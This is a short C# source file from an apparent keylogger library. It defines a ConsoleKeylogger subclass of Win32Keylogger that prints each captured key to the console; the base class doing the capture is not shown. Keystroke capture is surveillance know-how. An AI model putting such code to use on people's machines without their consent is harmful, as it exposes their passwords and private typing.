using System;
using System.Windows.Forms;

namespace CodeReactions.Keylogger
{
	public sealed class ConsoleKeylogger
		: Win32Keylogger
	{
		public ConsoleKeylogger()
			: base() { }

		protected override void HandleKey(Keys key)
		{
			Console.Out.WriteLine(key);
		}
	}
}
